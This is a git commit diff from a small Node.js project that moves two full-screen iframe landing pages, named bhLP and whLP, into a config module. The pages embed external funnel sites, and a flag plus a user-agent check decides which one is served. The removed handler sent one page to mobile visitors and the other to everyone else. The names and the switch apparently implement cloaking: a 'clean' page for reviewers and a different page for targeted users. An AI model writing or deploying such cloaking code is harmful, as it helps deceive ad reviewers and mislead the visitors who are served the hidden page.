d096328fb3eb3deacf46d009e8256bc56dfa1483
Asfar Ali <30603432+s4-ali@users.noreply.github.com>
2025-01-15 17:01:16 +0500

    Separated variables

--- api/config.js
+++ api/config.js
@@ -1,3 +1,74 @@
 // This file exports a boolean value to control redirection logic
 const isRedirectEnabled = false; // Change this value as needed
-export default isRedirectEnabled;
+
+
+let bhLP = `
+    <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fullscreen iFrame</title>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden; /* Prevent scrolling */
+        }
+
+        iframe {
+            display: block;
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+    </style>
+</head>
+<body>
+    <iframe src="https://jzudipwaq.myfunnelish.com/tt-shp-rw"></iframe>
+</body>
+</html>
+    `;
+
+const whLP = `
+    <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fullscreen iFrame</title>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden; /* Prevent scrolling */
+        }
+
+        iframe {
+            display: block;
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+    </style>
+</head>
+<body>
+    <iframe src="https://xjsdiaoqpwepa.myfunnelish.com/imbassd-1736879310456939"></iframe>
+</body>
+</html>`;
+
+
+function getLP(userAgent) {
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+
+    //TODO: Checks for isMobileDevice
+    return isRedirectEnabled ? bhLP : whLP;
+}
+
+export {isRedirectEnabled, getLP, bhLP, whLP};
--- api/redirect.js
+++ api/redirect.js
@@ -1,83 +1,14 @@
-import isRedirectEnabled from './config';
+import {bhLP, getLP, whLP} from "./config";
 
-export default function handler(req, res) {
-
-    var bhLP = `
-    <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fullscreen iFrame</title>
-    <style>
-        html, body {
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            height: 100%;
-            overflow: hidden; /* Prevent scrolling */
-        }
-
-        iframe {
-            display: block;
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            border: none;
-        }
-    </style>
-</head>
-<body>
-    <iframe src="https://jzudipwaq.myfunnelish.com/tt-shp-rw"></iframe>
-</body>
-</html>
-    `;
-    
-    var whLP = `
-    <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fullscreen iFrame</title>
-    <style>
-        html, body {
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            height: 100%;
-            overflow: hidden; /* Prevent scrolling */
-        }
-
-        iframe {
-            display: block;
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            border: none;
-        }
-    </style>
-</head>
-<body>
-    <iframe src="https://xjsdiaoqpwepa.myfunnelish.com/imbassd-1736879310456939"></iframe>
-</body>
-</html>`;
-
-    if (!isRedirectEnabled) {
-        bhLP = whLP;
-    }
-    // Get the User-Agent from the request headers
+export default async function handler(req, res) {
     const userAgent = req.headers['user-agent'] || '';
-    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
 
-    if (isMobileDevice) {
-      res.writeHead(200, { 'Content-Type': 'text/html' });
-      res.end(bhLP);
-    }
-    else { 
-      res.writeHead(200, { 'Content-Type': 'text/html' });
-      res.end(whLP);
-    }
-    
+    const lp = getLP(userAgent);
+
+    // Get the User-Agent from the request headers
+
+    res.writeHead(200, {'Content-Type': 'text/html'});
+    res.end(lp);
+
     res.end();
-  }
+}
